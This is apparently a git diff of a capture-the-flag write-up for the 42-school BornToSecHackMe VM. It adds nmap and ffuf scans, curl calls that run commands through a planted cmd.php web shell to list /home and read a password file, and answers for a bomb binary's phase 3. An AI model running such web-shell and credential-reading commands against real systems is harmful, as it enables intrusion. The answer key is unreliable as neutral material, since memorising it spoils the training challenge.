@@ -4,29 +4,46 @@ First, we have a virtual machine with a weak Linux OS, containing a lot of vulne
 ## Recon phase
 First when we run OS, we have are in reconnaisance phase, we have to find entrypoint of machine. To do so, we can run nmap on it. As our machine is on a virtualbox preset network. Address range we select is 192.168.56.0/24. We can run nmap on this range to potentially find our target. 
 
-```bash
-nmap -sn -n -PE 192.168.56.103
-```
+This command will perform a ICMP Echo Ping in the specified range 192.168.56.1 -> 192.168.56.254.
 
 To use nmap on 42 school computer we have to perform the scan inside a container, the command will be:
 ```bash
 # If nmap is installed on your host - https://nmap.org/download
-nmap -sn -n -PE 192.168.56.103
+nmap -sn -n -PE 192.168.56.0/24
 
 # Command to run nmap inside container
-docker run --rm -it instrumentisto/nmap -sn -n -PE 192.168.56.103
+docker run --rm -it instrumentisto/nmap -sn -n -PE 192.168.56.0/24
 ```
 
-This command will perform a ICMP Echo Ping in the specified range 192.168.56.1 -> 192.168.56.254.
-
 ```bash
-Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-13 11:28 UTC
+➜  ~ docker run --rm -it instrumentisto/nmap -sn -n -PE 192.168.56.0/24 
+Unable to find image 'instrumentisto/nmap:latest' locally
+latest: Pulling from instrumentisto/nmap
+213ec9aee27d: Pull complete 
+f30b2c90d95c: Pull complete 
+7eeec3a557a1: Pull complete 
+Digest: sha256:eee3f7c3df06ec65d134d979ca658f9d4920dc6d3acc9d29b5c42fdaa4d56176
+Status: Downloaded newer image for instrumentisto/nmap:latest
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-19 21:12 UTC
+Nmap scan report for 192.168.56.1
+Host is up (0.00021s latency).
+Nmap scan report for 192.168.56.100
+Host is up (0.00056s latency).
 Nmap scan report for 192.168.56.103
-Host is up (0.00079s latency).
-Nmap done: 1 IP address (1 host up) scanned in 0.06 seconds
+Host is up (0.00051s latency).
+Nmap done: 256 IP addresses (3 hosts up) scanned in 1.70 seconds
+➜  ~ 
 ```
 
 We found our target on ip 192.168.56.103. We can now perform a complete scan of our target, to do so the following nmap command will do a Full TCP port scan with service version detection and with default NSE scripts.
+
+```bash
+# If nmap is installed on your host - https://nmap.org/download
+nmap -T4 -sC -sV -p 1-65535 -sS 192.168.56.103
+
+# Command to run nmap inside container
+docker run --rm -it instrumentisto/nmap -T4 -sC -sV -p 1-65535 -sS 192.168.56.103
+```
 
 ```bash
 Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-13 11:32 UTC
@@ -89,9 +106,13 @@ ffuf http://192.168.56.103/FUZZ -w wordlist.txt
 
 We don't find any interessting path, so we will perform scan on ssl/http service.
 
+```bash
+ffuf https://192.168.56.103/FUZZ -w wordlist.txt
+```
+
 In the ffuf report, we can see three different interessting service:
 - Phpmyadmin service, we can potentially used to perform some SQL query if we found the password. https://192.168.56.103/phpmyadmin/
-- Forum on http://192.168.56.103/forum
+- Forum on https://192.168.56.103/forum
 - SquirrelMail service https://192.168.56.103/webmail/src/login.php
 
 In the page https://192.168.56.103/forum/index.php?id=6, we can see a log file pasted as thread.  
@@ -107,6 +128,7 @@ And we are right because if we try to login into the forum with these credential
 On the setting page of lmezard we have a potentially interessting email: laurie@borntosec.net 
 
 If we try to login into squirrel mail with the same credential, it work!
+https://192.168.56.103/webmail/src/login.php
 
 ```bash
 Hey Laurie,
@@ -154,6 +176,10 @@ Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UT
 
 By looking in home folder, we can see a LOOKATME folder in /home directory.
 
+```bash
+ls -l /home
+```
+
 curl -k https://192.168.56.103/forum/templates_c/cmd.php\?cmd\=ls%20-l%20/home
 
 ```bash
@@ -165,6 +191,10 @@ drwxr-x--- 1 laurie@borntosec.net laurie@borntosec.net  60 Oct 15  2015 laurie@b
 dr-xr-x--- 2 lmezard              lmezard               61 Oct 15  2015 lmezard
 drwxr-x--- 3 thor                 thor                 129 Oct 15  2015 thor
 drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz
+```
+
+```bash
+cat /home/LOOKATME/password
 ```
 
 curl -k https://192.168.56.103/forum/templates_c/cmd.php\?cmd\=cat%20/home/LOOKATME/password
@@ -216,6 +246,8 @@ The README file say that the result is laurie password and the fun file contain 
 ```bash
 ➜  ~ cat README 
 Complete this little challenge and use the result as password for user 'laurie' to login in ssh
+➜  ~ file fun
+fun: POSIX tar archive (GNU)
 ➜  ~ cat fun 
 ft_fun/0000750000175000001440000000000012575653666011066 5ustar  nnmusersft_fun/C4D03.pcap0000640000175000001440000000003412563172202012421 0ustar  nnmusers}void useless() {
 
@@ -527,9 +559,16 @@ void phase_3(char *param_1)
 }
 ```
 
-We can see that we need to provide three argument, the first one will be the switch case choose, the second is letter that will be compared at the end and the last one will be the number that will skip bomb explosion. So we have 7 combinaison working, here we will use the first one:
+We can see that we need to provide three argument, the first one will be the switch case choose, the second is letter that will be compared at the end and the last one will be the number that will skip bomb explosion. So we have 8 combinaison working, here is the seven possible combinaison:
 ```bash
 0 q 777
+1 b 214
+2 b 755
+3 k 251
+4 o 160
+5 t 458
+6 v 780
+7 b 524
 ```
 
 The phase four will be
